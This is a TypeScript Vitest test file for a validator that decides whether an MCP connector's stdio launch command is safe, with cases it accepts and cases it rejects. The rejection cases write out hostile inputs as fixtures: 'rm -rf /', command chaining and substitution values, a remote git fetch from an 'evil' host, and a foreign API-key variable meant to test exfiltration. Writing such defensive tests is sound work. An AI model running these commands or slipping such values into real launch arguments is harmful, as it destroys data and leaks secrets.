import { describe, expect, it } from "vitest";
import {
  assertStdioCommandSafe,
  isStdioCommandSafe,
  ConnectorCommandUnsafeError,
} from "../services/mcp-connector-command-safety.js";

describe("assertStdioCommandSafe — accepts a pinned launcher package", () => {
  it.each([
    ["npx", ["-y", "@notionhq/notion-mcp-server@1.9.0"]],
    ["npx", ["@modelcontextprotocol/server-filesystem@2024.11.5", "/tmp/workdir"]],
    ["npx", ["-y", "server-thing@1.2.3-rc.1"]],
    ["uvx", ["mcp-server-git@1.2.3"]],
    ["uvx", ["some-tool@1.2"]], // major.minor is a valid exact pin
    ["npx", ["-y", "@scope/pkg@10.0.0", "--server-flag", "value with spaces"]],
    ["npx", ["-y", "pkg@1.0.0", "C:\\Users\\me\\dir"]], // Windows path (backslash) is fine
    // The connector's OWN secret placeholder `${TOKEN}` is the single permitted
    // $-form: AoA substitutes it to the connector's real secret env var at
    // delivery. It is allowed in a post-package arg — standalone and embedded.
    ["npx", ["-y", "@notionhq/notion-mcp-server@1.9.0", "--token", "${TOKEN}"]],
    ["npx", ["-y", "pkg@1.0.0", "--flag=${TOKEN}"]],
    ["uvx", ["mcp-server-git@1.2.3", "--auth", "${TOKEN}"]],
    ["npx", ["-y", "pkg@1.0.0", "${TOKEN}"]], // bare placeholder
  ])("accepts %s %j", (command, args) => {
    expect(() => assertStdioCommandSafe(command, args)).not.toThrow();
    expect(isStdioCommandSafe(command, args)).toBe(true);
  });
});

describe("assertStdioCommandSafe — rejects unsafe commands", () => {
  it.each([
    ["node", ["-e", "require('child_process').exec('curl evil')"], "not_a_launcher"],
    ["sh", ["-c", "rm -rf /"], "not_a_launcher"],
    ["bash", [], "not_a_launcher"],
    ["docker", ["run", "x"], "not_a_launcher"],
    ["/usr/bin/npx", ["pkg@1.2.3"], "not_a_launcher"], // full path is not the bare launcher
    ["npx", ["@notionhq/notion-mcp-server"], "unpinned_package"], // no @version
    ["npx", ["-y", "pkg@latest"], "unpinned_package"],
    ["npx", ["pkg@^1.2.3"], "unpinned_package"], // range
    ["npx", ["pkg@1.x"], "unpinned_package"], // wildcard
    ["npx", ["--package", "x", "--call", "y"], "disallowed_flag"],
    ["uvx", ["--from", "git+https://evil/x", "pkg@1.0.0"], "disallowed_flag"],
    ["npx", ["-e", "pkg@1.0.0"], "disallowed_flag"],
    ["npx", ["-y", "pkg@1.0.0", "; rm -rf /"], "disallowed_character"], // chaining
    ["npx", ["-y", "pkg@1.0.0", "$(evil)"], "disallowed_character"], // substitution
    ["npx", ["-y", "`evil`"], "disallowed_character"], // backtick
    // Whitelisting `${TOKEN}` must NOT open the door to a FOREIGN var the CLI
    // would expand from AoA's own env (exfiltration), or to other $-forms.
    ["npx", ["-y", "pkg@1.0.0", "${AOA_API_KEY}"], "disallowed_character"], // foreign var
    ["npx", ["-y", "pkg@1.0.0", "${TOKEN}${OTHER}"], "disallowed_character"], // own + foreign
    ["npx", ["-y", "pkg@1.0.0", "$(evil)${TOKEN}"], "disallowed_character"], // subst + own
    ["npx", [], "no_package"],
    ["", ["pkg@1.0.0"], "missing_command"],
    // Surrounding whitespace: the launcher check trims, but the ORIGINAL string is
    // what gets persisted and spawned — " npx " would preview-safe then fail at exec
    // (or, on a future shell path, re-tokenize). Require the command to equal its
    // trimmed form. (Whitespace-ONLY is `missing_command`, handled above.)
    [" npx", ["-y", "pkg@1.0.0"], "not_a_launcher"], // leading space
    ["npx ", ["-y", "pkg@1.0.0"], "not_a_launcher"], // trailing space
    ["npx\t", ["pkg@1.0.0"], "not_a_launcher"], // trailing tab
  ])("rejects %s %j → %s", (command, args, reason) => {
    let thrown: unknown;
    try {
      assertStdioCommandSafe(command, args);
    } catch (e) {
      thrown = e;
    }
    expect(thrown).toBeInstanceOf(ConnectorCommandUnsafeError);
    expect((thrown as ConnectorCommandUnsafeError).reason).toBe(reason);
    expect(isStdioCommandSafe(command, args)).toBe(false);
  });
});
